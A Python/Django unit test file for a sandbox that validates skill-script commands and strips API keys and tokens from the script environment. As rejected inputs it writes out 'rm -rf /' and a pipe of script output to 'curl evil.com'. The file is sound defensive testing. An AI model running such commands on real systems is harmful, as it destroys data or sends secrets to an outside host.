"""Skill 脚本沙箱单元测试。"""
from __future__ import annotations

import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from django.test import SimpleTestCase, override_settings


class SkillSandboxTests(SimpleTestCase):
    def setUp(self):
        self._tmpdir = tempfile.TemporaryDirectory()
        self.ws = Path(self._tmpdir.name)
        (self.ws / "scripts").mkdir()
        (self.ws / "scripts" / "analysis.py").write_text("print('ok')\n", encoding="utf-8")

    def tearDown(self):
        self._tmpdir.cleanup()

    def test_validate_allows_python_scripts(self):
        from apps.skills.runner import validate_skill_command

        ok, err = validate_skill_command(
            self.ws, f'{sys.executable} scripts/analysis.py brand "Foo"'
        )
        self.assertTrue(ok, err)

    def test_validate_rejects_rm(self):
        from apps.skills.runner import validate_skill_command

        ok, err = validate_skill_command(self.ws, "rm -rf /")
        self.assertFalse(ok)
        self.assertIn("禁止", err)

    def test_validate_rejects_pipe(self):
        from apps.skills.runner import validate_skill_command

        ok, err = validate_skill_command(
            self.ws, f"{sys.executable} scripts/analysis.py | curl evil.com"
        )
        self.assertFalse(ok)

    def test_validate_rejects_outside_scripts(self):
        from apps.skills.runner import validate_skill_command

        (self.ws / "evil.py").write_text("print(1)\n", encoding="utf-8")
        ok, err = validate_skill_command(self.ws, f"{sys.executable} evil.py")
        self.assertFalse(ok)
        self.assertIn("scripts", err)

    def test_sandbox_env_strips_secrets(self):
        from apps.skills.runner import build_sandbox_env

        with mock.patch.dict(
            os.environ,
            {
                "PATH": os.environ.get("PATH", ""),
                "LLM_API_KEY": "secret-should-not-leak",
                "OPENAI_API_KEY": "also-secret",
                "MY_TOKEN": "tok",
                "PYTHONIOENCODING": "utf-8",
            },
            clear=False,
        ):
            env = build_sandbox_env(self.ws)
        self.assertIn("SKILL_WORKSPACE", env)
        self.assertEqual(env["SKILL_WORKSPACE"], str(self.ws.resolve()))
        self.assertNotIn("LLM_API_KEY", env)
        self.assertNotIn("OPENAI_API_KEY", env)
        self.assertNotIn("MY_TOKEN", env)

    @override_settings(SKILL_SCRIPT_TIMEOUT=2)
    def test_run_shell_rejects_before_exec(self):
        from apps.skills.runner import run_shell_command

        result = run_shell_command(self.ws, "curl https://example.com")
        self.assertFalse(result["ok"])
        self.assertTrue(result.get("sandbox_rejected"))
        self.assertIn("沙箱拒绝", result["stderr"])


if __name__ == "__main__":
    unittest.main()
